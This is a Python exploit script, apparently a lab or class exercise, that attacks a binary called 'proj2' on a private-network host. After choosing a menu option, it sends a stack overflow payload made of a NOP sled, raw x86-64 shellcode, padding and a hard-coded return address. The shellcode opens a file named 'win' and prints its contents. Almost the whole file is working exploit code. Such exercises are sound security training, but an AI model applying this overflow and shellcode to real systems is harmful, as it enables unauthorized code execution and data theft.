#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnlite import *
from pathlib import Path

#===========================================================
#       Set program specific variables here 
#===========================================================
EXE = "proj2"
TARGET_HOSTNAME = "172.16.11.100" # 172.16.11.52
TARGET_PORT = 4567

#=======================================================================================
# This is all boilerplate for the template DO NOT EDIT UNLESS YOU KNOW WHAT YOU'RE DOING
#=======================================================================================

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io : tube
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def get_executable_path(name : str):
    return '/'.join(Path(name).resolve().parts)

# Set the actual values that will be used later
exe = get_executable_path(EXE)
host = args.HOST or TARGET_HOSTNAME
port = int(args.PORT or TARGET_PORT)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
if __name__ == "__main__":
#===========================================================
#        Edit gdbscript to add break points, etc. 
#===========================================================
    # Specify your GDB script here for debugging
    # GDB will be launched if the exploit is run via e.g.
    # ./exploit.py GDB
    gdbscript = '''
    tbreak main
    continue
    b *(set_name+55)
    b *(start_assistant+209)
    '''.format(**locals())


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
    io = start()
    log.info(io.recvuntil(b"3. Exit\n"))
    io.sendline(b'1')
    nop_sled = b'\x90'*33
    shellcode = b'\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\xbf\x58\x77\x69\x6e\xc1\xef\x08\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05\x49\x89\xc0\x48\x31\xdb\x48\xff\xc3\x48\x31\xc9\x48\xff\xc1\x48\x31\xd2\x48\xff\xc2\x48\x29\xcc\x4c\x89\xc7\x48\x89\xe6\x48\x31\xc0\x0f\x05\x48\x39\xd8\x75\x11\x48\x0f\x1f\xc0\x48\x31\xff\x48\xff\xc7\x0f\x05\x48\x01\xcc\xeb\xdc\x48\x01\xe6\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x48\xc1\xe0\x05\x48\x83\xe8\x04\x48\x31\xff\x0f\x05'
    padding = b'\x90'*24
    payload = nop_sled + shellcode + padding + packing.p64(0x7fffffffffffdd30)
    io.sendline(payload)
    log.info(io.recvuntil(b"3. Exit\n"))
    io.interactive()
